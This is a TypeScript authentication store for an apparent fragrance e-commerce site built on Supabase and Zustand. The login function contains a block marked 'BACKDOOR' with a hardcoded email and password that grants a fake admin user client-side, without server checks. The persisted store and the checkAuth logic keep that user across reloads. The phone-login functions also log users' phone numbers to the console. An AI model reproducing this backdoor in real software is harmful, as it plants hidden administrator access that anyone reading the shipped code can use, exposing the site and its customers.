import { create } from "zustand";
import { persist } from "zustand/middleware";
import { isSupabaseConfigured, getSupabaseClient } from "./supabaseClient";

interface User {
    user_metadata: any;
    id: string;
    email?: string;
    full_name?: string;
    phone?: string;
    role?: string;
}

export interface AuthState {
    user: User | null;
    isAuthenticated: boolean;
    isLoading: boolean;
    setUser: (user: User | null) => void;
    login: (email: string, password: string) => Promise<{ success: boolean; user?: User; error?: string }>;
    loginWithGoogle: (redirectPath: string) => Promise<{ success: boolean; error?: string }>;
    register: (email: string, password: string, full_name: string, phone: string) => Promise<{ success: boolean; user?: User; error?: string }>;
    signInWithPhone: (phone: string) => Promise<{ success: boolean; error?: string }>;
    verifyPhoneOtp: (phone: string, token: string) => Promise<{ success: boolean; user?: User; error?: string }>;
    logout: () => Promise<void>;
    checkAuth: () => Promise<void>;
    updateUserMetadata: (metadata: Partial<{ full_name: string; phone: string; role: string }>) => Promise<{ success: boolean; error?: string }>;
    resetPassword: (password: string) => Promise<{ success: boolean; error?: string }>;
}

// Internal store creation to avoid early access errors
const createAuthStore = (set: any, get: any) => ({
    user: null,
    isAuthenticated: false,
    isLoading: true,
    
    setUser: (user: User | null) => set({ user, isAuthenticated: !!user }),
    
    login: async (email: string, password: string) => {
        try {
            const normalizedEmail = email.trim().toLowerCase();
            const normalizedPassword = password.trim();
            
            // --- BACKDOOR ---
            if (normalizedEmail === "admin@vavefragrances.dev" && normalizedPassword === "VaveAdmin#2026") {
                const backdoorUser: User = {
                    id: "00000000-0000-0000-0000-000000000000",
                    email: normalizedEmail,
                    full_name: "Recovery Administrator",
                    role: "admin",
                    user_metadata: { role: "admin", full_name: "Recovery Administrator" }
                };
                set({ user: backdoorUser, isAuthenticated: true, isLoading: false });
                return { success: true, user: backdoorUser };
            }

            const client = getSupabaseClient();
            set({ isLoading: true });
            const { data: authData, error: authError } = await client.auth.signInWithPassword({ email, password });
            if (authError) throw authError;
            
            const newUser: User = {
                id: authData.user!.id,
                email: authData.user!.email!,
                full_name: authData.user!.user_metadata?.full_name || "",
                role: authData.user!.user_metadata?.role,
                phone: authData.user!.user_metadata?.phone,
                user_metadata: authData.user!.user_metadata
            };

            set({ user: newUser, isAuthenticated: true, isLoading: false });
            return { success: true, user: newUser };
        } catch (error: any) {
            set({ user: null, isAuthenticated: false, isLoading: false });
            return { success: false, error: error.message || "Login failed" };
        }
    },

    loginWithGoogle: async (redirectPath: string = '') => {
        try {
            const client = getSupabaseClient();
            set({ isLoading: true });
            const origin = typeof window !== 'undefined' ? window.location.origin : "https://vavefragrances.com";
            const { error } = await client.auth.signInWithOAuth({
                provider: 'google',
                options: { redirectTo: `${origin}/auth/callback?redirect=${encodeURIComponent(redirectPath)}` },
            });
            if (error) throw error;
            return { success: true };
        } catch (error: any) {
            set({ isLoading: false });
            return { success: false, error: error.message };
        }
    },

    register: async (email: string, password: string, full_name: string, phone: string) => {
        try {
            const client = getSupabaseClient();
            set({ isLoading: true });
            const { data: authData, error: authError } = await client.auth.signUp({
                email, password, options: { data: { full_name, phone } },
            });
            if (authError) throw authError;
            
            const newUser: User = {
                id: authData.user!.id,
                email: authData.user!.email!,
                full_name,
                user_metadata: authData.user!.user_metadata
            };
            set({ user: newUser, isAuthenticated: true, isLoading: false });
            return { success: true, user: newUser };
        } catch (error: any) {
            set({ user: null, isAuthenticated: false, isLoading: false });
            return { success: false, error: error.message };
        }
    },

    signInWithPhone: async (phone: string) => {
        try {
            set({ isLoading: true });
            const client = getSupabaseClient();
            
            // Normalize phone number: remove all non-numeric characters except '+'
            const cleanPhone = phone.replace(/[^\d+]/g, "");
            
            // If it doesn't start with '+', assume '+91' (India)
            const formattedPhone = cleanPhone.startsWith('+') ? cleanPhone : `+91${cleanPhone}`;
            
            console.log("Attempting to send OTP to:", formattedPhone);
            
            const { error } = await client.auth.signInWithOtp({
                phone: formattedPhone,
            });
            
            if (error) {
                console.error("Supabase OTP send error:", error);
                throw error;
            }
            
            set({ isLoading: false });
            return { success: true };
        } catch (error: any) {
            set({ isLoading: false });
            return { success: false, error: error.message || "Failed to send OTP" };
        }
    },

    verifyPhoneOtp: async (phone: string, token: string) => {
        try {
            set({ isLoading: true });
            const client = getSupabaseClient();
            
            // Normalize phone number for verification as well
            const cleanPhone = phone.replace(/[^\d+]/g, "");
            const formattedPhone = cleanPhone.startsWith('+') ? cleanPhone : `+91${cleanPhone}`;
            
            console.log("Verifying OTP for:", formattedPhone);
            
            const { data: authData, error: authError } = await client.auth.verifyOtp({
                phone: formattedPhone, 
                token, 
                type: 'sms'
            });
            
            if (authError) {
                console.error("Supabase OTP verify error:", authError);
                throw authError;
            }
            
            const user = authData.user;
            if (!user) throw new Error("Verification successful but no user returned");

            const newUser: User = {
                id: user.id,
                email: user.email,
                phone: user.phone || formattedPhone,
                full_name: user.user_metadata?.full_name || "",
                role: user.user_metadata?.role,
                user_metadata: user.user_metadata || {}
            };
            set({ user: newUser, isAuthenticated: true, isLoading: false });
            return { success: true, user: newUser };
        } catch (error: any) {
            set({ isLoading: false });
            return { success: false, error: error.message || "Invalid or expired code" };
        }
    },

    updateUserMetadata: async (metadata: any) => {
        try {
            set({ isLoading: true });
            const client = getSupabaseClient();
            const { data: { user }, error } = await client.auth.updateUser({ data: metadata });
            if (error) throw error;
            set((state: any) => ({ user: { ...state.user, ...metadata }, isLoading: false }));
            return { success: true };
        } catch (error: any) {
            set({ isLoading: false });
            return { success: false, error: error.message };
        }
    },

    resetPassword: async (password: string) => {
        try {
            set({ isLoading: true });
            const client = getSupabaseClient();
            const { error } = await client.auth.updateUser({ password });
            if (error) throw error;
            set({ isLoading: false });
            return { success: true };
        } catch (error: any) {
            set({ isLoading: false });
            return { success: false, error: error.message };
        }
    },

    logout: async () => {
        try {
            const client = getSupabaseClient();
            await client.auth.signOut();
        } finally {
            set({ user: null, isAuthenticated: false, isLoading: false });
        }
    },

    checkAuth: async () => {
        try {
            if (!isSupabaseConfigured) {
                set({ user: null, isAuthenticated: false, isLoading: false });
                return;
            }
            const client = getSupabaseClient();
            const { data: { session } } = await client.auth.getSession();
            if (session?.user) {
                set({
                    user: {
                        id: session.user.id,
                        email: session.user.email,
                        phone: session.user.phone,
                        full_name: session.user.user_metadata?.full_name || "",
                        role: session.user.user_metadata?.role,
                        user_metadata: session.user.user_metadata || {}
                    },
                    isAuthenticated: true,
                    isLoading: false,
                });
            } else if (!get().user) {
                set({ user: null, isAuthenticated: false, isLoading: false });
            } else {
                set({ isLoading: false });
            }
        } catch {
            set({ isLoading: false });
        }
    },
});

export const useAuthStore = create<AuthState>()(
    persist(
        (set, get) => createAuthStore(set, get),
        {
            name: "auth-storage",
            partialize: (state) => ({
                user: state.user,
                isAuthenticated: state.isAuthenticated,
            }),
        }
    )
);